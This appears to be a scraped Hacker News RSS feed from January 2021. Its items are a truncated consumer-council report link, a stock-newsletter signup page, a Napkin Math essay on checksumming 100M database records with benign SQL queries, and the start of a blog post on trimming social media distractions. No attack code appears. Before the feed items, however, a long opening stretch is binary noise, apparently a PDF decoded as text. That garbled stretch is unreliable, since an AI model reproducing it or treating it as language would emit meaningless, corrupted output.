Ž=–—ë‰ZÝºC1(:1t(6‘—ï�ñ¦JR&gt;ªŠUF9ÅÞTâ¬Œ¸_Ž¼œy9ÕDróZ±)`aÕs
…U
fsÓÂEùÜÄÂp(¨çÄ´Â¢â
¾ ?™ã­,¥‚#qÌÿîd?gPÎíUÎ/�%»
V�\Æ%9ÍYå©Æ¦…©åÙ^¯�ó2¥"½¸*X«
¾®0ymv¯Y©4{í6¯I1ø†LÿÍ?eúÕBìÄ5¼¼lQe
ÿµ’äò�d§kBY`ú|ƒÅ(h,F“]©0›´é5‹÷Ø’HI6­kpˆ34ô�°Sf¿ûg"÷‡PÊÐ´F&lt;34 1á�¡Oh€Ñ0F
LÔM¸T#ùÔ‰ŸZñ3šŽSÉåL
ž•
§~®Õh�AoH­ÃvA‹´F-÷@è‰ÐoB|HÒš½�æfY3ª¬¬4—–æä´·›¥&amp;`MÆãù¦‚¼\i—fÿHÄM†*µ©ŸÇF×9º'«h¸šÔ�—j·ËÅKã¼žÃá¢bL»É¡ña“S}¾T‹JX3øÞY¼ÚJò¦°Ç�+-Ù?Á­¶á¿à_M¶{ô¯ÐªpYâ9•N%Èô»×è•&lt;¯4hönm¾!ƒ^'£*Aÿ&amp;²�º}N#žå3È‡&gt;œZøðƒ¤ÈÉ{4Ým‹Âu[®ÛlšL’9“dÎ$™3IæL’9óaXD£¡Ã�Gáè§ý�è§û
Õ‰ôËýZ‘~°_C(gŒên×ÖpwÚçyyŠq¯¿¡pkúóPåñJqÄ”âœöc¢Èó�F(CF@¤”òd©ÝyiŸÇ&nbsp;
#©ã@ÌØ&nbsp; µÄcP
œJ±@)3V½
ÃM…E�µ�ždfs¡�‰ŒË+`_Éœ®uÓ÷;228¼ñš®|{dÊ„‰‹jÓƒî’¶ñ#Õ�E®Ù©SÏnxù›²–ê0Þ0yycÅ›/M¸ Í—9oë¬ìySKÌê‰�«9œ3sbR¢=T6gðÍI-å¾DIRq#ù^uçÐ§‚V–öF´5û“PYD’bD’"Ð�ˆ�~L¤‘¤yœ++ëÄ9(€Â83niÁÐD”‹³ûUóÁø=N€s¨¸Œ8ë8pÎþXÀÀ™b–¦‰Âž°?6Q•K�bPw$B@ÔÕª—�²r›dIˆ�±Y“9"-¢º‚–“)­Ñ%Û¦ï|áŠYM×ýö¼’³Úê<j (5j}þœusæïí.žØuåÂy="" µœ?dtšõÖŒ4Ï¼;?»åŽ“,²ù'xô·Ùšdq¥å¤Õîyrû¶ÇÎ›Î="" ËmÉäo,]¾tÙŒ|è'¢&{+ØbôÓbôÓbiyÌ="" &‹ddy„è'rs‰º%‰º%½tkzé–$ê~„3!ht×7xp¸_fu‘ið(Ó»vo¿Ä¨="Ó7ÈHÎxL&amp;éU5nŒª)F)Öóþé]‰�EµJ½çƒ[®¹wÏýÛï]_ÊÝxÏ‰Ÿ7RZð³nXyðÂ'M»žM�–óÛ¡å™è~Òî~wš¤'iR«Ò¤V¥I­J“Z•6À™¢*•ÅoñCãÜXÕí" ãÃaüj‡Ãr9|Ó5¤é—�½öuë¡Ù9¢3jc�hox¬@�³ópzçÅ k�“="" â1ùÈ°[²¸]r="" î´�="" ˜naùí‚z§¼š†[¦Ô)e2øhÈq\="" vmp?›Ãj�z˜jö˜•thj³Çjö˜”‰³tÆ$‹Ùmt$ò”&y÷="" }ÃÏy¥¡Ý¢¼i^i^i^i^i^�×a�%{Ð¢ý‹k="">€Ó÷\dr�fòœ#¦ÒQR±�¬c�7H2ˆ‰¹a
ž±Ok3›�™TøyÐ~E:Fmù¨Òêw;ƒV%H¤NL=bI‚ÆNS=6‹Ç¤ü›B§�ÉàC¸ŸÃí^8ô±p®Ì�*Ñ›t|$%œd|8ÉøpûíTk	muÝÐ¡'Ò°?-šÖ‘Æ§$)$)$ëc�¬�A’’�|¯ §Â0PKs*Ájð¢Ô8#^ÚdÛÒŸ3ŸhX šdË�¶·6æDzARÇƒ1R‰¬Øý1Y©zgˆ•6å�šâ±œùT­ŽDL£%:Æ›ˆš;%ÊÙD,þˆå„s¥V¡-Y¼»íì{Ï©¬Ýú‹žòmGM&amp;A3èM»Ymž´hiwÞuýl~û/Ž_9ã‚žZ·ZXlñZ”áìðìÞÇ×l?|a�×‹·S&nbsp;”Jc’9aq‡½A§¶ý¾O¯¹ñ›¾Nw(Ã”4P˜Mz�ôÄ�Ê&lt;ÒJâÕJâÕJJ¨•”P+‰WK:&amp;É‘¢!=§!=§!=§!=§!–MCæPŠÚ`â�ZÈ‡Ñ„g¢(\Gr8}®9&amp;4Âä˜5ÖâW´X;Ö×�¡~¼Ã¬z”t‰¤Ô#C¾Ý³B£––�!-Œzí)&gt;Ž8Ð+ÙHuz´zÓéÁiŒæ*­§ÛoUîÎET\i
:]«’›%*=pnè,Ðm­’«üã…×7ø
'g¼$mÜÒ¶¡N"íC•Ž9Ž&lt;’Ž$�#IàH8’ŽÛ¯:|ä¦66ŠÂ¡Œüýb"´xLCY“pkˆÊp¸F?þÈ#ÃS*†&gt;ÆïÂS¦£mÔÇEÿÁãyáñLx–WjT=‚ó‘¦ªì~™4ÓƒQ~\ÏþP£E5€ó÷Ç,2§8­ËØ´&gt;2väl5 .FÚònRÍšÆ¤âì&nbsp;F!ãx˜½•®P¶/˜ë7ÒFZT¸nÖ®¶&lt;•Á¤Õš\f;,fƒ)»a
+i1gÌ­-@»D[dÊ#F'—èoáj©wÔRóÕRóÕRóÕRóÕd8hmi�µÑÓhñÓ+ÙÔš!n¹ftÉé²p8
ŸA5%ïÛf•+0¶Ûù¯Ö&nbsp;'”iW$RNÕOü¼Üè¸Ý~‹BgN4á—MŠ$2YÉ�jîâÁ-ÃöxDOŸä*UZ… ƒ�Û184x£Û"Íçõ 7Õ×‡��ŠÂ&amp;‰Â&amp;‰Â&amp;‰Â&amp;‰ÂF¾§„T†FÛŽH6Îyi¤ç
�rrix*;�F2åÔÃ´ª&lt;âÈnÝ+dQoõXT0ÁÞÏÚpâ•)‰ö§&lt;sj9úƒØŸÆŽŠµœ.7×‘“£Îv:Ý?ÐÑ"Ý™œ’§Õª‰}Sû¦&amp;öMMì›šè‡š(&lt;¬,¢.¢ý)E
§C—ãÌË–ûÒ|ÍÌ|UšauU`ëXc‡9Séäœ‚²vk‡¥öëpŽT2f`‡0YšÁ"
‡ÆLÕâ*
�)�(­&gt;—#`Qr‰^cóZmÉV
—˜ŠÁŽ¹œ&nbsp;&amp;™žþÜ§
o–á=·/ìZeðX´#öaù‰kj/€GËè†Óïš�¢u§{N.àïJžàÒ¨,^›4«ì”™Ðdt—¸bH3¬’ØEj�¨N¤Ÿ±[%±[E±'«³³ó‰Øó�òó�ZÂA–|’Åˆ’KÕÙ†4ÁEü¢c¢Œˆ˜O“rNY†éO)à”J0™RQÂðÙí¶34™w„Gé§°SgsëŠÝi¡�-±Â?%‰ã8¥ÅçtúÌÊLw£7Íç5áIÞ¢ü&lt;'¯ÐâsÙýfåTk’Y©ñæ§qo—î(›vÝŒ“ÿ�÷¦ÕŽßà³…]í9söÍá‡u38–`ª8Ô5t\ø@“š†n¡+d+‘‘•¨¦•,*¬dQauR1DU~”‹vÁê:Y~²¤óÉ’Ã”,9LÉ’ð“�åš¹À=24…ÈØ•Í»¸hÃý—èþšd!q(Ëæ�]\ŒÚÉ×£ÖbÂ3®~ëš¿ziÍŒkÞºæŠ£{k¦-üÉÚµ?Y’n»~ýº§s×Ýr²É‚»¾¼ý†oX2ÿçÿúÅêÇ.�=ï²G–¯?|é¬yW&lt;*®´Àv?c=	e&nbsp;ÛD:E.5U.5U.
o¹4¼åRSåD‰&amp;/&nbsp;—ÐkÔêðL/Ù1ð’—þ‘)•¸yr¹š§ÙokÐŽr­©Š�^sÈIîƒ1Èn#ùÄÄ§z×¡S]jaÔ²‹&amp;ºù—ç^­²\ÄÎMpcÛ„Y+WÍÌ8X¶&nbsp;=ó¶›f/¯Ká¯î¼yuy"{x‚Ê(•‹¶,˜sV¡~ðëô©]¢¦L‘]š’†ÊÐãÔÃVÌé¤­é¤­éDYÒ‰²¤eI‡öFÕÈŸ”›´+‰OÊ—D˜/‰0_Ò–|I[ò%æ“ïïšj]QGSªPLTFGTæèKDT¥#z3ìM—‚´@!)UÅ&nbsp;\TÐéŠEÒ‰:d&lt;ê~‰È�l‰È$�¥ÉG¯ð¥�&gt;E±&nbsp;Õj­ÜÚºñÂŠ¼ëº˜‚]úû+¦Y2*&amp;L_=-ÝªLÜwª®­wøLò@e[yræü»þ}û�_…ûç-
×\¸6«¼:h°„¸·W?zéì¦½¯XÿÄe&nbsp;}�IÚ'h@ûŠP
zL”r²1ÛT¬Ñ)‹UL¤^LÄ\ò:”Aö¬2*MD¶À™$›$55Ijj’dl"_ÌHÊ6Â‚öÁµQ�:&amp;ƒv48¤ÉE\ô¨=("èxv”=ƒ‚RòÁ˜T”¿á}'6¥¤ñÙüi:jw$óÒ&gt;”Ãb·ãÂpZ8Ìv
4rkJ²;`Õ›mYóÊ60íÍp`KÞwý†Ùi¡ªE¥þÂ¬tëF½21X3×UYpÕ=5]U&gt;˜^ÀS�aÏ+\PüÓ°VÃJQÆëJæ¯©ž²|Î$«&gt;R&gt;;/ñNŠ—¿hæJ‡Bž˜(›óÌÔ¡ã|èùtœNý“)C0ñÌ)’8§Hbž"Í2S$±Nà2£‘ü¨ÅŠgæGÁ_MÉOÉ×zœ¤¬‡Lò£‘|@é:ÏÃ\™é÷{Dw÷ð~—D­”&gt;h mö#8
Ãò2Õ˜üÅ¸8ªÑâ™&amp;òÎžšpÅ¦b“½œ,Ã§xdMv’……î:n"û‘H»ñ¸‘˜˜‘•Ž™^1½ÅÙäMê˜	&nbsp;áC1±ÖRí¡˜X¯ŒT<l�¡tdªzÄ4cÜêÂa7ûÔ­39ßu½ùŽö)k”94à2+õs×Í(i¯nÉo\¹zecaÙÊ«æeÌ*·ÈŽ—kšœšöiesÝùmg­>«©Ÿ½ðò®|»?èLõÙ½fE0=”\&lt;·&nbsp;xvY^AÅ¼usÎ›Ÿepù,“ÓbN²¨’B^onUjÑìòü‚ÉMëˆ‡n+ÿŒ³ õÐ9£dÀDä~€,C~°É'îšièðA2Îäf²aâ•¬z&gt;,£&gt;ÅûTÄx„È8.÷šÅ]/³ãù#[$#kHf’DWõ5qèæŽ'íñŠûCâÎÈ‰[‡µ|©Ò”d±Ðóhç½0¿oo;‚R›Ý‘…ýÄzø‰5ñµôßÓO4’ü€¨iôÚ´Ù%QØ%QØ%QØ%QØ%QØæŒd%IVàä5á¨
ªP‡��ž�Ü’ýŽDF-3’ŒdKqDÉ*GÏú#¼õÔu›°¥v×À¦³ûvÖÐ}#‹2³iÓôúM
QjX¶½uÎC»ª*¶&lt;¸™1I�ügÛžÖ¬Ì–ðŽÑëé Xà ±´‡J,…ßôì&amp;4ìÆéÖáLÎtb×€dD†˜f'K!LÔL’\N—3œêktÊÌt}m.­4™1&gt;¤õ¨½···GÚ#žCÃÙœb&gt;bHE‡\ ^dQÑ(7&lt;ßn—+¸C‚Þ•æµœ&amp;­‚O´*±9=˜0«¼ã•¼L©/EÇ+“ÉÙ†Õ˜F)ÄÅÓ¥N}â	¡’¤“ÓÒöÉ°ÎyÚ^ŽzE;\Žabþ*ZMM*(´’0é98Õ(¦¤â&nbsp;“0Aìô&amp;+gåâ¬œÂÅ�C¹~ô¦xÆ•ÐÛÈ¡’ôã‰NÍËÜè‘ö“	Ï¸S%1V&amp;²Ý‚1)#ÙIÒ‰Ï¸ox½;ÃÈL2ð‰{åØöûR,
‡0¶ò*kjrRÀªâq‡½¼Üò&amp;‡ŒXÖ›ˆ�lÒó¿=™ÃxaŸ…</l�¡tdªzä4cüêâa7ûô­39ßu½ùžö)k”94à2+õs×í(i¯néo\¹zecaùê«æeì*·èž—kšœšöiesýùmg­></j></j27‰1â�šúmüuè�wà'‘*á~></léc”></kÿ¡äijž¢ä%¿¦9ecorr˜’'èµç)yœ&></fvîw¨ð></lë”…é�rz{í¡|ñøàxw§^lˆ></d®ñ‡dzòrdô#oƒêtôó„6tÿpƒ:ïxí#tßè8ÿáøø·þ—è></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf">https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf</a></em></p>]]>
            </description>
            <link>https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773083</guid>
            <pubDate>Thu, 14 Jan 2021 06:59:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The Average Joe – Simplifying the Stock Market for the Average Joe]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25773046">thread link</a>) | @theaveragejoe
<br/>
January 13, 2021 | https://readthejoe.com/subscribe/ | <a href="https://web.archive.org/web/*/https://readthejoe.com/subscribe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="start"><div id="content"> <div><div><div> <p><img src="https://readthejoe.com/wp-content/uploads/2020/08/Logo@3x-1.png"></p><h2>Join 6,000+ investors discovering new market opportunities</h2><p>Become a better investor with our free 2x-weekly newsletter.</p></div></div></div><div><div><p><img src="https://readthejoe.com/wp-content/uploads/2021/01/TAJ-Subscribe-Media-1-2.png"></p><div><h2>Market trends and opportunities</h2><p>Our team of analysts researches and analyzes emerging market opportunties to help you achieve better investment returns.</p></div></div><div><div><h2>Save 1,000+ hours on analysis and research</h2><p>We spend hundreds of hours each week analyzing the market to bring you the most important information.</p></div><p><img src="https://readthejoe.com/wp-content/uploads/2021/01/TAJ-Subscribe-Media-2.png"></p></div><div><p><img src="https://readthejoe.com/wp-content/uploads/2020/09/Homescreen-Tabs.jpg"></p><div><h2>Simple and brief financial news and trends</h2><p>We break down complicated financial topics and cover only the important news and trends to make you a better investor.</p></div></div></div></div></div></div>]]>
            </description>
            <link>https://readthejoe.com/subscribe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773046</guid>
            <pubDate>Thu, 14 Jan 2021 06:55:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Use a Restaurant Bot to Engage with Customers?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25773001">thread link</a>) | @botpenguin
<br/>
January 13, 2021 | https://botpenguin.com/how-to-use-a-restaurant-bot-to-engage-with-customers/ | <a href="https://web.archive.org/web/*/https://botpenguin.com/how-to-use-a-restaurant-bot-to-engage-with-customers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://botpenguin.com/how-to-use-a-restaurant-bot-to-engage-with-customers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773001</guid>
            <pubDate>Thu, 14 Jan 2021 06:46:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Napkin Problem 14: Using checksums to verify syncing 100M database records]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25772983">thread link</a>) | @kiyanwang
<br/>
January 13, 2021 | https://sirupsen.com/napkin/problem-14-using-checksums-to-verify/ | <a href="https://web.archive.org/web/*/https://sirupsen.com/napkin/problem-14-using-checksums-to-verify/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article-content">
    <p>
        This is an edition of the <a href="https://sirupsen.com/napkin/">Napkin Math newsletter</a>,
        a newsletter about using napkin math and first-principle thinking to
        estimate the performance of systems.
        You can <a href="https://sirupsen.com/napkin">subscribe through email.</a>
    </p>

    <p>A common problem you’ve almost certainly faced is to sync two datastores. This problem comes up in numerous shapes and forms: Receiving webhooks and writing them into your datastore, maintaining a materialized view, making sure a cache reflects reality, ensure documents make it from your source of truth to a search index, or your data from your transactional store to your data lake or column store.</p>
<p><img src="https://buttondown.s3.us-west-2.amazonaws.com/images/8b99afab-9ae3-47cf-8703-f465aaec1473.png" alt=""></p>
<p>If you’ve built such a system, you’ve almost certainly seen B drift out of sync. Building a completely reliable syncing mechanism is difficult, but perhaps we can build a checksumming mechanism to check if the two datastores are equal in a few seconds?</p>
<p>In this issue of napkin math, we look at implementing a solution to <strong>check whether A and B are in sync for 100M records in a few seconds</strong>. The key idea is to checksum an indexed <code>updated_at</code> column and use a binary search to drill down to the mismatching records. All of this will be explained in great detail, read on!</p>
<h2 id="why-are-syncing-mechanisms-unreliable">Why are syncing mechanisms unreliable?</h2>
<p>If you are firing the events for your syncing mechanism after a transaction occurs, such as enqueuing a job, sending a webhook, or emit a Kafka event, you can’t guarantee that it <em>actually</em> gets sent after the transaction is committed. Almost certainly part of pipeline into database B is leaky due to bugs: perhaps there’s an exception you don’t handle, you drop events on the floor above a certain size, some early return, or deploys lose an event in a rare edge case.</p>
<p>But <em>even</em> if you’re doing something that’s theoretically bullet-proof, like using the database replication logs through <a href="https://debezium.io/">Debezium</a>, there’s still a good chance a bug somewhere in your syncing pipeline is causing you to lose occasional events. If theoretical guarantees were adequate, <a href="https://jepsen.io/">Jepsen</a> wouldn’t uncover much, would it? A team I worked with even wrote a TLA+ proof, but still found bugs with a solution like the one I describe here! In my experience, a checksumming system should be part of <em>any</em> syncing system.</p>
<p>It would seem to me that building reliable syncing mechanisms would be easier if databases had a standard, fast mechanism to answer the question: <em>“Does database A and B have all the same data? If not, what’s different?"</em> Over time, as you fix your bugs, it will of course happen more rarely, but being able to guarantee that they are in sync is a huge step forward.</p>
<p>Unfortunately, this doesn’t exist as a user API in modern databases, but perhaps we can design such a mechanism <em>without</em> modifying the database?</p>
<p>This exploration will be fairly long. If you just want to see the final solution, scroll down to the end. This issue shows how to use napkin math to incrementally justify increasing complexity. While I’ve been thinking about this problem for a while, this is a fairly accurate representation of how I thought about the problem a few months ago when I started working on it. It’s also worth noting that when doing napkin math usually, I don’t write prototypes like this if I’m fairly confident in my understanding of the system underneath. I’m doing it here to make it more entertaining to read!</p>
<h2 id="assumptions">Assumptions</h2>
<p>Let’s start with some assumptions to plan out our ‘syncing checksum process’:</p>
<ul>
<li>100M records</li>
<li>1KiB per record (~100 GiB total)</li>
</ul>
<p>We’ll assume both ends are SQL-flavoured relational databases, but will address other datastores later, e.g. ElasticSearch.</p>
<h2 id="iteration-1-check-in-batches">Iteration 1: Check in Batches</h2>
<p>As usual, we will start by considering the simplest possible solution for checking whether two databases are in sync: a script that iterates through all records in batches to check if they’re the same. It’ll execute the SQL query below in a loop, iterating through the whole collection on both sides and report mismatches:</p>
<div><pre><code data-lang="sql"><span>SELECT</span> <span>*</span> <span>FROM</span> <span>`</span><span>table</span><span>`</span>
<span>ORDER</span> <span>BY</span> id <span>ASC</span>
<span>LIMIT</span> <span>@</span><span>limit</span> <span>OFFSET</span> <span>@</span><span>offset</span>
</code></pre></div><p>Let’s try to figure out how long this would take: Let’s assume each loop is querying the two databases in parallel and our batches are 10,000 records (10 MiB total) large:</p>
<ul>
<li>In MySQL, reading 10 MiB off SSD at <a href="https://github.com/sirupsen/napkin-math#numbers">200 us/MiB</a> will take ~2ms. We assume   this to be sequential-ish, <a href="http://yoshinorimatsunobu.blogspot.com/2013/10/making-full-table-scan-10x-faster-in.html">but this is not entirely true</a>.</li>
<li>Serializing and deserializing the MySQL protocol at <a href="https://github.com/sirupsen/napkin-math#numbers">5 ms/MiB</a>, for a total   of ~2* 50ms = 100ms.</li>
<li>Network transfer at <a href="https://github.com/sirupsen/napkin-math#numbers">10 ms/MiB</a>, for a total of ~100ms.</li>
</ul>
<p>We’d then expect each batch to take roughly ~200ms.  This would bring our theoretical grand total for this approach to <code>200 ms/batch * (100M / 10_000) batches ~= 30min</code>.</p>
<p>To test our hypothesis against reality, I implemented this to <a href="https://github.com/sirupsen/napkin-math/blob/master/newsletter/14-syncing/check.rb">run locally for the first 100 of the 10,000 batches</a>. In this local implementation, we won’t incur the network transfer overhead (we could’ve done this with <a href="https://github.com/shopify/toxiproxy">Toxiproxy</a>). Without the network overhead, we expect a query time in the 100ms ballpark. Running <a href="https://github.com/sirupsen/napkin-math/blob/master/newsletter/14-syncing/check.rb">the script</a>, I get the following plot:</p>
<p><img src="https://buttondown.s3.us-west-2.amazonaws.com/images/dfef5830-f658-4268-b655-ec23e64ce90c.png" alt=""></p>
<p>Ugh. The real performance is pretty far from our napkin math lower bound estimate. What’s going on here?</p>
<p>There’s a fundamental problem with our napkin math. Only the <em>very</em> first batch will read only <code>~10 MB</code> off of the SSD in MySQL. <code>OFFSET</code> queries will read through the data <em>before</em> the offset, even if it only returns the data after the offset! Each batch takes 3-5ms more than the last, which lines up well with reading another 10 MiB per batch from the increasing offset.</p>
<p>This is the reason why OFFSET-based pagination causes so much trouble in production systems. If we take the area under the graph here and extend to the 10,000 batches we’d need for our 100M records, we get a <strong>~3 day runtime</strong>.</p>
<h2 id="iteration-2-outsmarting-the-optimizer">Iteration 2: Outsmarting the optimizer</h2>
<p>As <code>OFFSET</code> will scan through all these 1 KiB records, what if we scanned an index instead? It’ll be much smaller to skip 100,000s of records on an index where each record only occupies perhaps 64 bit. It’ll still grow linearly with the offset, but passing the previous batch’s 10,000 records is only 10 KiB which would only take a few hundred microseconds to read.</p>
<p>You’d think the optimizer would make this optimization itself, but it doesn’t. So we have to do it ourselves:</p>
<div><pre><code data-lang="sql"><span>SELECT</span> <span>*</span> <span>FROM</span> <span>`</span><span>table</span><span>`</span>
<span>WHERE</span> id <span>&gt;</span> (<span>SELECT</span> id <span>FROM</span> <span>table</span> <span>LIMIT</span> <span>1</span> <span>OFFSET</span> <span>@</span><span>offset</span>)
<span>ORDER</span> <span>BY</span> id <span>ASC</span> 
<span>LIMIT</span> <span>10000</span>;
</code></pre></div><p><img src="https://buttondown.s3.us-west-2.amazonaws.com/images/47a71e04-2c3d-48e6-a7de-c2240d1ac26f.png" alt=""></p>
<p>It’s better, but just not by enough. It just delays the inevitable scanning of lots of data to find these limits. If we interpolate how long this’d take for 10,000 batches to process our 100M records, we’re still talking on the <strong>order of 14 hours</strong>. The 128x speedup doesn’t carry through, because it only applies to the MySQL part. Network transfer is still a large portion of the total time!</p>
<p>Either way, if you have some OFFSET queries lying around in your codebase, you might want to consider this optimization.</p>
<h2 id="iteration-3-parallelization">Iteration 3: Parallelization</h2>
<p>This seems like an embarrassingly parallel problem: Can’t we just run 100 batches of 10,000 records in parallel? Can the database support that? Since we can pre-compute <em>all</em> the LIMITs and OFFSETs up front, let’s abuse that?</p>
<p>This seems kind of difficult to do the napkin math on. Typically when that’s the case, I try to solve the problem backwards: Fundamentally, the machine can <a href="https://github.com/sirupsen/napkin-math#numbers">read sequential SSD at 4 GiB/s</a>, which would be an absolute lower bound for how fast the database can work. The dataset is 100 GiB, as we established in the beginning.</p>
<p>If we’re using our optimization from iteration 2, then our queries are on average processing <code>50M * 64 bit</code> for the sub-query, and the <code>10 MiB</code> of returned data on top. That’s a total of ~400 MiB. So for our 10,000 batches, that’s 4.2 TB of data we will need to munch through with this query. We can read 1 GiB from SSD in 200ms, so that’s 14 minutes in total. That would be the <em>absolute</em> lowest bound, assuming essentially zero overhead from MySQL and not taking into consideration serialization, network, etc.</p>
<p>This also assumes the MySQL instance is doing <em>nothing</em> but serving our query, which is unrealistic. In reality, we’d dedicate <em>maybe</em> 10% of capacity to these queries, which puts us at 2 hours. Still faster, but a far cry from our hope of seconds or minutes. Buuh.</p>
<h2 id="iteration-4-dropping-offset">Iteration 4: Dropping OFFSET</h2>
<p>It’s starting to seem like trouble to use these OFFSET queries, even as sub-queries. We held on to it for a while, because it’s nice and easy to reason about, and means the queries can be fired off in parallel. We also held on to it for a while to truly show how awful these types of queries are, so hopefully you think twice about using it in a production query again!</p>
<p>If we change our approach to maintain <code>max(id)</code> from the last batch, we can simply change our loop’s query to:</p>
<div><pre><code data-lang="sql"><span>SELECT</span> <span>*</span> <span>FROM</span> <span>`</span><span>table</span><span>`</span>
<span>WHERE</span> id <span>&gt;</span> <span>@</span>max_id_from_last_batch
<span>ORDER</span> <span>BY</span> id <span>ASC</span>
<span>LIMIT</span> <span>10000</span>;
</code></pre></div><p>This curbed the linear growth!</p>
<p><img src="https://buttondown.s3.us-west-2.amazonaws.com/images/6b0263d5-c59f-4127-a573-6b06d615c195.png" alt=""></p>
<p>Now MySQL can use its efficient primary key index to do <a href="https://www.wolframalpha.com/input/?i=log%28100*10%5E6%29%2Flog%281024%2F3*2%2F%288%2B4%29%29+%2B+1++*https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F8.0%2Fen%2Festimating-performance.html*">~6 SSD seeks</a> on <code>id</code> and then scan forward. This means we only process and serialize 10 MiB, putting our napkin math consistently around 100ms per batch as in the original estimate in iteration 1. That means this solution should <strong>finish in about half an hour!</strong> However, we learned in the previous iteration that we are constrained by only taking 10% of the database’s capacity, so as calculated from iteration 3, we’re back at 2 hours..</p>
<p>We fundamentally need an approach that handles less data, as the serialization and network time is the primary reason why the integrity checking is now slow.</p>
<h2 id="iteration-5-checksumming">Iteration 5: Checksumming</h2>
<p>If we want to handle less data, we need to have some way to fingerprint or checksum each record. We could change our query to something along the lines of:</p>
<div><pre><code data-lang="sql"><span>SELECT</span> MD5(<span>*</span>) <span>FROM</span> <span>table</span>
<span>WHERE</span> id <span>&gt;</span> <span>@</span>max_id_from_last_batch
<span>ORDER</span> <span>BY</span> id <span>ASC</span>
<span>LIMIT</span> <span>10000</span>;
</code></pre></div><p>If there’s a mismatch, we simply revert to iteration 4 and find the rows that mismatch, but we have to scan far less data as we can assume the majority of it lines up.</p>
<p>Before moving on, let’s see whether the napkin math works out:</p>
<ul>
<li>Reading 10 MiB off SSD at <a href="https://github.com/sirupsen/napkin-math#numbers">200 us/MiB</a> will take ~2ms.</li>
<li>Has…</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sirupsen.com/napkin/problem-14-using-checksums-to-verify/">https://sirupsen.com/napkin/problem-14-using-checksums-to-verify/</a></em></p>]]>
            </description>
            <link>https://sirupsen.com/napkin/problem-14-using-checksums-to-verify/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25772983</guid>
            <pubDate>Thu, 14 Jan 2021 06:44:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimize Your Distractions]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25772946">thread link</a>) | @akhilkg
<br/>
January 13, 2021 | https://www.akhilkg.me/blog/distractions | <a href="https://web.archive.org/web/*/https://www.akhilkg.me/blog/distractions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I’m not a “systems” person.</p>
<p>It’s not like I never tried - making schedules, using a Pomodoro timer,&lt;insert productivity “hack”&gt; - they didn’t work because I was trying to fit a square peg in a round hole.</p>
<p><img src="https://user-images.githubusercontent.com/32199592/104540572-bb4c3d00-5645-11eb-86f9-de27e6b8d07d.jpg" alt="square_peg.jpg"> <small> <a href="https://baddadcartoons101.wordpress.com/2017/09/04/square-peg-and-a-round-hole/" target="_blank" rel="noopener noreferrer"> <i> Source: BadDadCartoons </i> </a> </small> </p>
<p>What I ended up doing was instead of focusing on optimising the time I spent productively - i.e. the “deep work” part (which happened rather spontaneously independent of whether I’m on a productivity hack or not) - I decided to focus on the time that was not “deep work” i.e. time spent on ‘distractions’ or entertainment.</p>
<p>I used to spend an unhealthy amount of time in a day on Instagram where the feed was mostly filled with memes. I also used Quora/Twitter a lot.</p>
<p>Consuming content is easy. Like junk food. It's almost embedded in our reflexes.</p>
<p>But here’s the thing - you can easily turn your distractions to things that can benefit you.</p>
<p>How?</p>
<p>Start with cutting off distractions that have too much noise i.e. do not give you a good return of investment on your time in any of the following:</p>
<ul>
<li>Specific knowledge/skills</li>
<li>Specific insight</li>
<li>Accessing and leveraging a network</li>
</ul>
<p>For the ones that remain, optimise the shit out of them.</p>
<p>For me, that meant Instagram was instantly off the list. Twitter and Quora were okay, but I had a long way to go.</p>
<br>
<h3> Optimising your feed </h3>
<p>Social media “feed”.
What comes to your mind when you think of the word - “feed”?</p>
<p>This comes to my mind when I think “feed”</p>
<p><img src="https://user-images.githubusercontent.com/32199592/104541024-c0f65280-5646-11eb-92f6-de5227d4b8a1.png" alt="sheep.jpg"> <i> <small> Sheep, “feed”ing </small>
</i> </p>
<p>Our minds are literally “fed” content.</p>
<p>“We are what we eat” - this doesn’t just stand for physical, tangible food - it applies to the digital content we feed our mind with.</p>
<p>I want you to take this literally because we take our attention for granted. In a digital economy run by monetising attention - it will naturally be full of noise.</p>
<p>Most of the content we read or watch is optimised solely for capturing our attention and clicks. More times than not, you don’t need something that is being shown to you. You will be perfectly fine without knowing it existed. Yep, sounds crazy but it is true.</p>
<p>I’m not trying to say social media is bad. Social media is an amplifier of all there is - of both the good stuff and the bad. It is an amplifier of your primal instincts so if you don’t proactively weed out the bad stuff from your feed regularly, you are going to get sick. Really sick.</p>
<p>What that means is, with some conscious effort you can filter out your feed to keep only the things that benefit you. Here’s how:</p>
<p><strong>Tip #1</strong></p>
<p>Don’t follow brands. Follow people.</p>
<p>I’ll bring the sheep here, again.</p>
<p>When I imagine a brand account, I imagine the shepherd.</p>
<p>And all of the 100-200-500k followers as the sheep.</p>
